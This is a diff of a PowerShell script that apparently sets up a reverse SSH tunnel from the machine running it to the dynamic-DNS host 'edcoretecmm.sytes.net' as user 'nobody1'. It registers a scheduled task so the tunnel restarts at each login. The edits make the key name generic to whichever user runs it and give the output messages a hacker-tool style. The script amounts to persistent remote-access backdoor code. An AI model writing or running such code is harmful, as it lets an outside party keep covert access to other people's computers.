@@ -21,7 +21,7 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
 
 # Prepare SSH key path
 $sshDir = "$env:USERPROFILE\.ssh"
-$keyFile = "$sshDir\gonza_ed25519"
+$keyFile = "$sshDir\$($env:USERNAME)_ed25519"
 $pubKeyFile = "$keyFile.pub"
 $user = "nobody1"
 $remote_host = "edcoretecmm.sytes.net"
@@ -61,6 +61,6 @@ if ($LASTEXITCODE -ne 0) {
         /ru "$env:USERNAME"
 }
 
-Write-Host "`n✅ Reverse SSH tunnel setup complete."
-Write-Host "It will start automatically on user login."
-Write-Host "You can test it now by running: `n$batFilePath"
+Write-Host "[!] Reverse SSH tunnel setup complete."
+Write-Host "[!] It will start automatically on user login."
+Write-Host "[*] You can test it now by running: $batFilePath"
